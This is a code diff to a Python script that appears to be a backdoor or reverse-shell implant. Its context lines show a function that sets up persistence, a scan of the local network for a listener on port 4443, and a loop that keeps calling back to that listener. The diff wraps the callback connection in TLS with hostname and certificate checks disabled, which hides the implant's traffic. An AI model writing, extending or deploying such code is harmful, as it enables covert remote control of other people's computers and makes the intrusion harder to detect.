@@ -1,4 +1,5 @@
 import socket
+import ssl
 import subprocess
 import time
 import os
@@ -13,6 +14,7 @@ from Crypto.Cipher import AES
 
 PORT = 4443
 CHECK_INTERVAL = 10
+SERVER_HOSTNAME = 'localhost'  # Palitan kung iba ang hostname
 
 def get_network_segment():
     try:
@@ -36,10 +38,16 @@ def find_listener():
         if target_ip == get_active_ip():
             continue
         try:
+            # SSL connection test
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)
-            result = sock.connect_ex((target_ip, PORT))
-            sock.close()
+            ssl_sock = context.wrap_socket(sock, server_hostname=SERVER_HOSTNAME)
+            ssl_sock.settimeout(1.0)
+            result = ssl_sock.connect_ex((target_ip, PORT))
+            ssl_sock.close()
             if result == 0:
                 return target_ip
         except:
@@ -67,13 +75,18 @@ def setup_persistence():
             pass
 
 def connect():
+    context = ssl.create_default_context()
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+
     while True:
         try:
             listener_ip = find_listener()
             if listener_ip:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.connect((listener_ip, PORT))
-                return sock
+                ssl_sock = context.wrap_socket(sock, server_hostname=SERVER_HOSTNAME)
+                ssl_sock.connect((listener_ip, PORT))
+                return ssl_sock
         except:
             pass
         time.sleep(CHECK_INTERVAL)
